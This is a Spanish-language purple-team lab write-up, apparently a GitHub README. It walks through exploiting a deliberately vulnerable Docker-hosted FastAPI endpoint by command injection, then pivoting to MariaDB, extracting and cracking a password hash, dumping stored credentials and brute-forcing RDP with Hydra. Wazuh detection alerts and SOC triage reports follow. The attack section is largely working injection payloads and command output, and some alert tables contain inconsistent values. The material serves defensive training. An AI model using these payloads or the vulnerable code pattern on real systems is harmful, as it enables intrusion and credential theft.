
<div align="center">

# 🛡️ Docker Intrusion & SOC Response: API, MariaDB and Lateral Movement , Active Response (IA)

### API exploitation – Compromised credentials – Attack detection

**`Wazuh`** `·` **`Kali Linux`** `·` **`Docker`** `·` **`Mittre At&ck`**

---

🔴 **Ataque** &nbsp;→&nbsp; 🔵 **Detección** &nbsp;→&nbsp; 🟢 **Respuesta**

</div>



## 📌 Objetivo

El objetivo de este caso es crear, analizar y responder  una intrusión de múltiples etapas dentro de una infraestructura basada en Docker, desde la perspectiva de Ataque-Detecion-Respuesta

El escenario parte de una API vulnerable desplegada sobre Docker en un servidor Ubuntu, utilizada como punto de acceso inicial. A partir de este acceso, la actividad progresa hacia la exploración del entorno Docker y el acceso a un contenedor MariaDB, donde se encuentra información relacionada con activos, usuarios y credenciales.

La obtención de credenciales permite continuar la cadena de ataque mediante técnicas de Credential Access, recuperación de credenciales y un posterior intento de Lateral Movement hacia otros sistemas de la infraestructura.

Durante el desarrollo del incidente, el SOC utiliza Wazuh para monitorear la actividad, generar alertas mediante reglas personalizadas, utilizar playbooks para responder ante incidentes, investigar los eventos y relacionar las distintas acciones con técnicas de MITRE ATT&CK.


## :triangular_ruler: Arquitectura

El laboratorio SOC cuenta con dos redes segmentadas, separando el entorno de ataque del entorno de monitoreo.

- Red de Laboratorio: contiene los endpoints y servicios donde se desarrolla el escenario de ataque. En esta etapa, Kali Linux actúa como atacante y Ubuntu Server como objetivo, alojando la API vulnerable, Docker y MariaDB.

- Red de Estudio / SOC: contiene la infraestructura utilizada para monitorear, analizar y responder a los eventos generados en la red de laboratorio, principalmente mediante Wazuh.
  
<div>
<img width="1800" height="803" alt="Diagrama Caso2#" src="https://github.com/user-attachments/assets/1df88b4b-85ba-48ab-9ae4-a9fb0cfd5a39" />
</div>

<br>
<br>
 El laboratorio está construido sobre tres pilares técnicos:

Infrastructure Status API — La puerta de entrada. Una API FastAPI intencionalmente vulnerable a inyección de comandos.
app.py con CWE-78 — El corazón de la vulnerabilidad. Explicaré exactamente dónde está el fallo y cómo se explota.
Active Response Script — El mecanismo de contención. Cómo Wazuh reacciona automáticamente para bloquear movimiento lateral.


1️⃣ Infrastructure Status API — Diseño Intencional

La API está desarrollada en FastAPI, un framework moderno de Python que permite crear endpoints RESTful de forma sencilla. La propuse específicamente porque:

Es fácil de contenerizar (Docker)
Simula una aplicación real de "chequeo de infraestructura"
Es lo suficientemente simple para que sea obvio dónde está la vulnerabilidad (para fines educativos)
Integra logging JSON nativo, perfecto para que Wazuh lo procese

| Componente | Versión | Rol |
| :--- | :--- | :--- |
| **Framework** | FastAPI 0.104.1 | Aplicación web |
| **Servidor ASGI** | Uvicorn 0.24.0 | Ejecutor de la aplicación |
| **Validador de datos** | Pydantic 2.5.0 | Modelos de entrada/salida |
| **Python** | 3.11 | Runtime |
| **Contenedor** | Docker 3.8+ | Entorno aislado |
| **Puerto** | 8080 | Exposición del servicio | 

Ubicación en el laboratorio:

La API corre dentro de un contenedor Docker llamado infrastructure-status-api en la red lab-network (172.18.0.0/16). Esto permite que sea accesible desde la máquina atacante (Kali, 192.168.3.163) pero también que se comunique internamente con MariaDB (172.18.0.3).

# docker-compose.yml 

```json
services:
  infrastructure-api:
    build: .
    container_name: infrastructure-status-api
    ports:
      - "8080:8080"
    volumes:
      - ./logs:/home/ub-serv/api-infrastructure-status/logs
    networks:
      - lab-network
```

2️⃣ app.py — Disección de la Vulnerabilidad (CWE-78: OS Command Injection)

Ahora viene lo importante. Aquí está el código vulnerable:

```json
python
@app.post("/check-host")
def check_host(request: HostCheckRequest):
    """
    Chequea si un host está accesible mediante ping.
    VULNERABLE: Command Injection en el parámetro hostname
    """
    hostname = request.hostname

    try:
        # VULNERABILIDAD INTENCIONAL: No sanitiza la entrada
        # Un atacante puede hacer: hostname="; cat /etc/passwd; echo"
        cmd = f"ping -c 1 {hostname}"

        result = subprocess.run(
            cmd,
            shell=True,              # ⚠️ AQUÍ ESTÁ EL PROBLEMA
            capture_output=True,
            text=True,
            timeout=5
        )

        output = result.stdout + result.stderr

        log_request(
            "/check-host",
            {"hostname": hostname},
            output[:200],
            "success"
        )

        if result.returncode == 0:
            return {"status": "online", "hostname": hostname, "output": output}
        else:
            return {"status": "offline", "hostname": hostname, "output": output}
```

------

## Herramientas y Tecnologías

 ![Ubuntu](https://img.shields.io/badge/Ubuntu-Server-E95420?style=flat-square&logo=ubuntu&logoColor=white)

 ![Docker](https://img.shields.io/badge/Docker-Containerization-2496ED?style=flat-square&logo=docker&logoColor=white)

 ![Python](https://img.shields.io/badge/Python-API%20Development-3776AB?style=flat-square&logo=python&logoColor=white)

 ![MariaDB](https://img.shields.io/badge/MariaDB-Database-003545?style=flat-square&logo=mariadb&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-SIEM%20%26%20Monitoring-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Custom%20Rules-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Playbooks-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Framework-FF0000?style=flat-square&logoColor=white)

 ![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Red%20Team-557C94?style=flat-square&logo=kalilinux&logoColor=white)

 ![John](https://img.shields.io/badge/John%20the%20Ripper-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)

 ![Hashcat](https://img.shields.io/badge/Hashcat-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)


  ## :small_red_triangle_down: Escenario  Attaque 

Esta sección documenta la fase ofensiva del de este desde la perspectiva del atacante. Kali Linux actúa como origen del ataque contra la Red de Laboratorio, con el objetivo de vulnerar una API expuesta en Ubuntu Server, utilizarla como punto de pivote hacia el contenedor MariaDB, y obtener credenciales que permitan avanzar hacia el resto de la infraestructura.  


- ## API Exploitation & Initial Access

En esta fase parto de una API expuesta en Ubuntu Server, sin saber todavía qué hay detrás de ella. El primer objetivo es lograr ejecución de comandos sobre el servidor, y una vez conseguido eso, empiezo a reconocer el entorno de red para entender dónde estoy parado y qué otros servicios podrían estar corriendo cerca


### ✅ [1.1] — Reconocimiento del servicio — Puerto de la API   

Antes de meterme con la API en sí, hago un barrido de puertos sobre la red del laboratorio para entender qué superficie tengo disponible. Con nmap -sV 192.168.3.0/24 escaneo todo el segmento y encuentro dos puertos de interés: 8080 , 3389

```
nmap -sV 192.168.3.0/24 
```
<div>

  <img width="1013" height="682" alt="paso2scan" src="https://github.com/user-attachments/assets/ea4d50a8-3adb-4029-a4b1-2e2c6fb1fdbe" />


</div>

----

### ✅ [1.2] — Command Injection 

Con el puerto 8080 identificado, pruebo el endpoint /check-host, que recibe un parámetro hostname. Noto que no sanitiza la entrada, así que inyecto un comando separado por ;. El resultado confirma ejecución de comandos sobre el servidor. 

```
 curl -X POST [http://192.168.3.100:8080/check-host](http://192.168.3.100:8080/check-host) -H "Content-Type: application/json" -d '{"hostname":"8.8.8.8; whoami"}'
```


<div>

  <img width="1002" height="119" alt="paso 1 2" src="https://github.com/user-attachments/assets/bdbe3907-845d-4f9d-8d98-efe0b13ddada" />

</div> 


----

### ✅ [1.3] — Network Discovery 

Con ejecución de comandos confirmada, reutilizo el mismo canal para reconocer la red interna. Consulto la tabla de rutas del sistema y aparece un segmento 172.18.0.0/16 que no es el de la red del laboratorio — es la red interna de Docker, lo que me indica que hay contenedores corriendo detrás de la API.



```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; cat /proc/net/fib_trie"}'
```
<div>
  
<img width="994" height="264" alt="paso1 3" src="https://github.com/user-attachments/assets/57bc98a0-d059-4814-b5ba-fbcf548f5174" />

</div> 


----

### ✅ [1.4] — Host Discovery

Con la red interna identificada, escaneo el segmento para localizar hosts activos y detectar nuevos objetivos. Busco identificar qué sistemas están disponibles para continuar avanzando desde el punto comprometido. 


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; ping -c 1 172.18.0.3"}'
```
<div>
  
<img width="1009" height="147" alt="paso 1 4" src="https://github.com/user-attachments/assets/c2b85393-9643-4d86-a7eb-0dda5d607dc0" />


</div>


---

### ✅ [1.5] — Service Discovery 

Con el host 172.18.0.3 identificado, verifico la disponibilidad del puerto 3306 para determinar si existe un servicio de base de datos accesible. La respuesta confirma que el servicio MariaDB está expuesto y permite continuar con la siguiente etapa del ataque.  


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; nc -zv 172.18.0.3 3306"}'
```

<div>

<img width="1009" height="139" alt="paso 1 5" src="https://github.com/user-attachments/assets/b34603f0-433d-4c0e-8608-9b5780f053fd" />

  
</div>

----

### ✅ [1.6] — Database Access

Con MariaDB identificado en 172.18.0.3:3306, intento establecer una conexión directa desde el sistema comprometido. Ejecuto SELECT 1 para validar que la base de datos acepta la conexión y que puedo interactuar con ella.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -e \"SELECT 1;\""}'
```

<div>

  <img width="1009" height="160" alt="pas 1 6" src="https://github.com/user-attachments/assets/b6d3b392-c13d-4040-b9f2-4dda6837fd26" />

</div>


*****

*Con la conexión a MariaDB confirmada, doy por finalizada la fase de Acceso Inicial. La API vulnerable permitió ejecutar comandos sobre el servidor y utilizarlo como punto de acceso hacia la red interna, donde pude identificar un host activo y acceder al servicio MariaDB.*

****



 - ## Database Discovery & Credential Access

Con el acceso a MariaDB confirmado, comienzo a enumerar la base de datos para identificar su estructura, usuarios y credenciales. El objetivo es obtener información sensible que permita ampliar el acceso y continuar avanzando sobre la infraestructura.

### ☑️ [2.1] — Conexión anónima + enumeración de usuarios 

Con la conexión a MariaDB confirmada, intento acceder sin especificar un usuario y consulto la tabla mysql.user. El objetivo es identificar las cuentas existentes en el servidor

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u \"\" -e \"SELECT user FROM mysql.user;\""}'
```

<div>

  <img width="1004" height="274" alt="mariadbpaso2 1" src="https://github.com/user-attachments/assets/56455771-f532-422b-a8f4-c1e0ada552bc" />

</div>


---

### ☑️  [2.2] — Acceso con TCFD

Con los usuarios identificados pruebo primero con el user TCFD identificado , intento autenticarme en MariaDB utilizando esta cuenta. Ejecuto una consulta de validación para comprobar si el usuario dispone de acceso efectivo al servicio

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT 1;\""}'
```

<div>
<img width="996" height="193" alt="paso2 2maria" src="https://github.com/user-attachments/assets/ea5fb4db-7479-4529-b85b-9bcc027a749a" />

</div>


---

### ☑️ [2.3] — Identificación del usuario actual

Con el acceso mediante TCFD confirmado, valido la identidad efectiva de la sesión utilizando CURRENT_USER(). El resultado confirma que la conexión se está ejecutando como TCFD@172.18.0.2, estableciendo el contexto de usuario desde el que continuaré la enumeración.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT CURRENT_USER();\""}'
```

<div>

<img width="991" height="202" alt="paso2 3maria" src="https://github.com/user-attachments/assets/275cd7e4-1046-4f16-af9a-6fff46f55a33" />

  
</div>


---

### ☑️ [2.4] — Extracción del hash de labadmin 

Con la identidad de la sesión confirmada, consulto mysql.user para obtener el valor de authentication_string asociado a labadmin. El resultado expone el hash de autenticación almacenado por MariaDB, proporcionando material que puede utilizarse para una posterior etapa de análisis de credenciales.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT user, authentication_string FROM mysql.user WHERE user='\''labadmin'\'';\""}'
```

<div>
<img width="998" height="219" alt="paso2 4maria" src="https://github.com/user-attachments/assets/98c4efb5-71e6-4086-a4a0-a2661e37fff5" />

  
</div>


```text
labadmin
*A0F874BC7F54EE086FCE60A37CE7887D8B31086B
```

--- 

### ☑️ [2.5] — Cracking offline 

En esta etapa intento recuperar la contraseña a partir del hash, trabajando de forma offline sobre Kali. Utilizo John the Ripper con el diccionario rockyou.txt, que prueba diferentes contraseñas hasta encontrar una que genere el mismo hash.

```bash
echo "labadmin:*A0F874BC7F54EE086FCE60A37CE7887D8B31086B" > hash_labadmin.txt
```

Se ejecuta John the Ripper:

```bash
john hash_labadmin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
```
```text
user: labadmin 
Password: password123
```
<div>

  <img width="1002" height="318" alt="jonhtriper" src="https://github.com/user-attachments/assets/978db4b8-8639-4946-8e8f-6f0f1883ddf6" />

</div>


--- 

### ☑️ [2.6] — Autenticación con labadmin

Con la contraseña obtenida mediante el proceso de cracking offline, intento autenticarme en MariaDB utilizando la cuenta labadmin. Una vez autenticado, consulto las bases disponibles para validar los privilegios de acceso obtenidos y continuar con la enumeración.


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"SHOW DATABASES;\""}'
```

<div>
 <img width="994" height="135" alt="paso2 6maria" src="https://github.com/user-attachments/assets/61e10671-cb12-4cd3-a264-6fc5b0b0eb49" />
</div>


--- 

### ☑️ [2.7] — Enumeración de tablas 

Con corporate_assets identificada como objetivo, enumero sus tablas para conocer la estructura de la información almacenada y localizar aquellas que puedan contener datos relevantes. 

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SHOW TABLES;\""}'
```

<div>

  <img width="1014" height="130" alt="paso2 7maria" src="https://github.com/user-attachments/assets/a25d3404-e235-4c55-876b-b3a7a6e792a1" />

</div>


--- 

### ☑️ [2.8] — Enumeración de endpoints 

Con las tablas identificadas, consulto los registros de endpoints mediante SELECT *. El objetivo es obtener la información almacenada en esa tabla y analizar los equipos registrados en la base de datos.

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM endpoints;\""}'
```

<div>

<img width="996" height="194" alt="paso2 8maria" src="https://github.com/user-attachments/assets/fdb16b1a-b6ba-461d-a43e-073b57f507f1" />

  
</div>



- mariadb-prod          Database    172.18.0.3           3306     active
- web-server            SSH         192.168.3.100        22       active
- **`windows-srv `**    Windows     192.168.3.10         3389     active



### ☑️ [2.9] — Exfiltración de credenciales

La consulta expone los registros almacenados en credentials, incluyendo usuarios y contraseñas asociadas a distintos servicios y equipos del laboratorio. Esta información amplía el alcance del acceso obtenido y proporciona credenciales que pueden ser utilizadas para intentar autenticación sobre otros endpoints de la infraestructura.

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM credentials;\""}'
```

<div>

  <img width="998" height="203" alt="paso2 9" src="https://github.com/user-attachments/assets/01623ae4-c3d7-4580-b96d-d545573ec938" />

</div> 

- dbadmin — DBLab-2026-01
- webadmin — WebLab-2026-02
- **`administrador`** — WinLab-2026-03
- svc_backup — BackupLab-2026-04
- backup_operator — BackupLab-2026-05
- fin_user — FinanceLab-2026-06

*****
*Esta fase permitió ampliar el acceso inicial obtenido sobre la infraestructura, pasando de un acceso al servicio MariaDB a disponer de información interna de la organización. La base de datos expuso información sobre sistemas, usuarios y credenciales almacenadas, permitiendo identificar relaciones entre los datos y los distintos endpoints del laboratorio.*

*Como resultado, se obtuvo una credencial asociada a un usuario con presencia en otro endpoint de la red, proporcionando información de autenticación que amplía el alcance del acceso conseguido y permite validar hasta dónde puede extenderse el compromiso dentro de la infraestructura.*


*****


##  Lateral Movement & Windows Access

Con la información obtenida en la operacion hacia Mariadb  —el endpoint windows-srv en 192.168.3.10:3389 y una credencial asociada a administrador— tengo ahora un objetivo concreto dentro de la infraestructura. En esta fase intento moverme lateralmente desde el entorno comprometido hacia Windows Server, aprovechando el servicio RDP que ya había identificado como abierto en el escaneo inicial. 

### ⏹️ [3.1] — Fuerza bruta contra RDP

Con el usuario administrador como objetivo conocido, intento autenticarme contra el servicio RDP de Windows Server mediante un ataque de fuerza bruta mediante diccionario, buscando validar si la contraseña es alcanzable. 

```bash
hydra -l Administrador -P midiccionario.txt rdp://192.168.3.10 -t 1 -V
```

<div>

<img width="1004" height="100" alt="fb-1" src="https://github.com/user-attachments/assets/a1bc0b8a-aa84-4e34-9fa9-3fcfd7c43f7f" />

</div>
<img width="1004" height="308" alt="fb-2" src="https://github.com/user-attachments/assets/4d98b488-9d8d-4ad8-898b-b782722ba755" />

<div>
  
</div>



******
📈  *El objetivo de esta sección fue demostrar cómo una única superficie expuesta puede convertirse en el punto de partida de un compromiso progresivo. Partí sin conocer la infraestructura detrás de la API y fui avanzando paso a paso: logré ejecución de comandos, reconocí la red interna, descubrí MariaDB, enumeré usuarios, extraje y crackeé credenciales, y finalmente identifiqué un nuevo objetivo dentro de la infraestructura hacia donde moverme lateralmente.*

*Lo importante no es solo que cada técnica funcionó, sino que ningún paso fue aislado — cada hallazgo alimentó el siguiente. Una API sin validación de entrada terminó exponiendo credenciales de Windows Server.*

*En la siguiente sección analizo esta misma cadena desde el lado defensivo: qué detectó Wazuh, qué reglas se dispararon y cómo respondió el sistema de forma automática ante el ataque*


******


## 🛡️ Detección — Monitoreo y Análisis de Alertas 

Durante el desarrollo del escenario de ataque, Wazuh estuvo monitoreando en tiempo real toda la actividad generada sobre la infraestructura. Cada técnica ejecutada desde Kali dejó una traza en los logs del sistema que el agente recopiló, procesó y envió al manager para su análisis.

En esta sección muestro cómo esa actividad fue detectada: las reglas personalizadas que escribí para identificar cada técnica, las alertas que se dispararon en el dashboard, y la correlación entre lo que hizo el atacante y lo que vio el SIEM. Todo mapeado contra MITRE ATT&CK.


Asumo los roles de SOC L1 y L2 para analizar las alertas generadas durante la actividad detectada en el laboratorio. El análisis comienza con el triage inicial de las alertas y continúa con una investigación más profunda, correlacionando eventos, evidencias y técnicas identificadas durante la actividad.

<div>

<img width="881" height="491" alt="platform-overview-cover" src="https://github.com/user-attachments/assets/cd77e218-beec-4cae-b9d8-db8b769d1a0f" />

</div>

------ 

El SOC L1, responsable de la monitorización y análisis inicial de las alertas, identificó en primera instancia un comportamiento compatible con Command Injection, que activó la regla 100310. Esta alerta permitió al L1 establecer el punto de entrada del incidente y orientar el análisis de la actividad posterior observada en la infraestructura.

A partir de la continuidad de la actividad detectada, se generaron nuevas alertas asociadas a Network Discovery (100311) y Host Discovery (100312), permitiendo al SOC L1 correlacionar la secuencia de eventos y obtener una visión más completa del comportamiento observado para obtener informacion y datos relevantes para el escalamiento .


<div align="center">
<img width="2557" height="912" alt="discovery 310-312" src="https://github.com/user-attachments/assets/65978028-42d9-43c1-aa7c-04ca57039bdf" />
</div>
<div align="center">
<img width="2559" height="913" alt="Discovery 310" src="https://github.com/user-attachments/assets/4ccee032-fb04-4eab-a585-25ece1ea27bb" />
</div>

<br>
<br>



## Rule 100310 

<br>

<div>
   <img width="2545" height="501" alt="regla 100310" src="https://github.com/user-attachments/assets/de8cec0c-f155-42ca-b6e4-fb2b8bca05a0" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.result | PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. 64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=9.66 ms --- 8.8.8.8 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 8.8.8.8; whoami | 
| rule.level | 10|
| rule.mitre.id | T1059.004 | 
| rule.mitre.tactic | Execution |
 

<br>
<br>



## Rule 100311

<br>

<div>
<img width="2542" height="452" alt="regla 100311" src="https://github.com/user-attachments/assets/f1396495-8101-4c46-b08b-25605ce2ddec" />
</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:08:05 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.result |PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.075 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 127.0.0.1; cat /proc/net/fib_trie | 
| rule.level | 8|
| rule.mitre.id | T1016 | 
| rule.mitre.tactic | Discovery |


<br>
<br>



## Rule 100312

<br>

<div>
<img width="2523" height="213" alt="regla 100312" src="https://github.com/user-attachments/assets/54136e12-15a6-42cf-aa92-907eba6f1dae" />
</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:08:53 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent|
| rule.id |  | 
| rule.description |  | 
| rule.level | 8|
| rule.mitre.id | T1018 | 
| rule.mitre.tactic |   Discovery |
| data.result | PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.071 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 127.0.0.1; ping -c 1 172.18.0.3 | 



---------------------
<br>

## Informe 
Las tres alertas se validan como actividad maliciosa, no como falso positivo. El endpoint /check-host solo debería recibir un host para hacer un ping, y en ese campo llegan comandos del sistema que además se ejecutaron. Ningún uso normal de la aplicación produce eso.

Las alertas siguen una progresión lógica (ejecución, reconocimiento de la red, apunte a otro host interno), propia de un ataque en preparación. 

<br>

- La regla 100310 confirma ejecución de comandos, algo que un administrador legítimo no haría a través de /check-host.
- Las alertas 100311 y 100312 se disparan minutos después sobre el mismo agente, endpoint y parámetro, lo que descarta eventos aislados.
- El destino del último comando (172.18.0.3) es un host interno distinto del servidor comprometido, lo que indica intención de movimiento lateral.


 <br>
 
 La conclusion sobre este escenario es  actividad maliciosa confirmada ,no se trata de un falso positivo  y se procede a documentar y escalar al L2 

 



# Ticket / Escalacion 

                                                                            
-  [🎫 Tickets - Command Injection en /check-host con reconocimiento de red interna (Ubunt-Serv-Agent) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)                 

----

<br>

Seguido a los intentos de Command Injection detectados anteriormente, y como continuación de la cadena de actividad observada, se identificaron nuevas alertas indicando que el atacante comenzó a utilizar el acceso obtenido sobre la API para explorar y pivotar hacia servicios internos. Las alertas generadas evidencian una progresión desde el reconocimiento de red hacia el acceso directo a una base de datos MariaDB ubicada en la red interna de contenedores Docker (172.18.0.0/16), confirmando que el compromiso inicial sobre la API fue utilizado como vector de movimiento hacia otros recursos de la infraestructura. 

<br> 

<div>
  <img width="2557" height="890" alt="discovery nuevo 402-404" src="https://github.com/user-attachments/assets/8883dfce-1eca-4b71-81f2-0658341cee66" />

</div>
<div> 

<img width="2556" height="912" alt="discovery nuevo 405" src="https://github.com/user-attachments/assets/c2a69846-bd07-49cd-bfe1-130efe07db1c" />

</div>
<div>
 <img width="2558" height="908" alt="discovery nuevo 406" src="https://github.com/user-attachments/assets/a7b14036-4ed1-48bb-a772-7a4ebfe4f7eb" />

</div>

<br>
<br>



## Rule 100402 

<br>

<div>
   <img width="2532" height="217" alt="402" src="https://github.com/user-attachments/assets/68751554-d8a6-4ed8-8737-0f4eae5fe31f" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:14:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user |root | 
| data.mariadb.host  |  127.18.0.2| 
| data.maradb.query | SELECT user FROM mysql.user | 
| rule.level | 8|
| rule.description | MAriadb -Enumeracion de usuarios del Sistema  | 
| rule.mitre.id | T1078 | 
| rule.mitre.tactic |  Discovery  |

<br>
<br>



## Rule 100403

<br>

<div>
  <img width="2546" height="276" alt="403" src="https://github.com/user-attachments/assets/986410ee-f1f4-49c9-9c2d-857098c6f8c9" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:14:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.naruadb.user |TCFD | 
| data.mariadb.host  |  127.18.0.2| 
| data.maradb.query | SELECT 1 | 
| rule.level | 8|
| rule.description | MAriadb -Accesos mediante credenciales validas detectado | 
| rule.mitre.id | T1078 | 
| rule.mitre.tactic | Defensive evasion/ Persistence / Initial Acces |
 
<br>
<br>



## Rule 100404

<br>

<div>
  <img width="2527" height="201" alt="404" src="https://github.com/user-attachments/assets/96e87540-fc72-4d97-8575-e517a87ed6ce" />

</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user |TCFD| 
| data.mariadb.host | 127.18.0.2| 
| data.mariadb.query | SELEC_CURRENT_USER() | 
| rule.level | 8|
|ruel.descripcion | Mariadb-Identificacion del ususario actual detectada |
| rule.mitre.id | T1033 | 
| rule.mitre.tactic | Discovery |


<br>
<br>



## Rule 1003405 

<br>

 <div>
   <img width="2527" height="182" alt="405" src="https://github.com/user-attachments/assets/fe25e907-f878-437c-b306-e14abb312b9e" />

 </div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:19:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user | labadmin | 
| data.maria.host  | 127.18.0.2| 
| data.mariadb.query | SHOW DATABASES | 
| rule.level | 8|
| rule.description  |Mariadb-Enumeracion de estructura e informacion de infraestructura detectada |
| rule.mitre.id | T1213 | 
| rule.mitre.tactic | Collection |

<br>
<br>



## Rule 100406 

<br>

 <div>
<img width="2527" height="182" alt="406" src="https://github.com/user-attachments/assets/d4ed79c8-97b1-47bb-b332-09a9876917c0" />

 </div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user | kabadmin | 
| data.mariadb.host  |  corporate_assests | 
| data.maria.database | SELECT * FROM credentials | 
| rule.level | 12|
| rule.description | Mariadb- Acceso a informacion de credenciales detectada |  
| rule.mitre.id | T1213| 
| rule.mitre.tactic | Collectioin |
 
 
---------------------
<br>

## Informe 
Las secuencias de eventyos descarta cualquier actividad legitima por las siguietes razones: 

- Las consultas proveniente del host 127.18.0.2, que es el contenedor de la API comprometida en la Fase 1 - no es un acceso directo administrativos 
- El ususario TCFD no deberia tener actividad de enumeracion sobre mysql.user
- La progresion es lineal y deliberada: enumeracion -> acceso -> reconocimiento -> exfiltracion 
- La alerta 100406 confirma acceso a datos sensibles de la organizacion - credenciales de multiples sistemas 

 <br>
 
La conclusion sobre este escenario queda como un verdadero positivo confirmado . La cadena de actividad iniciada en el ataque anterior escala a un acceso y posible exfiltracion de credenciales. Se procede a escalar al L2 con ticcket de alta prioridad 

 



# Ticket / Escalacion 

                                                                            
-  [🎫 Tickets - Acceso y exfiltración de credenciales detectado sobre MariaDB) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)                 

----

<br>

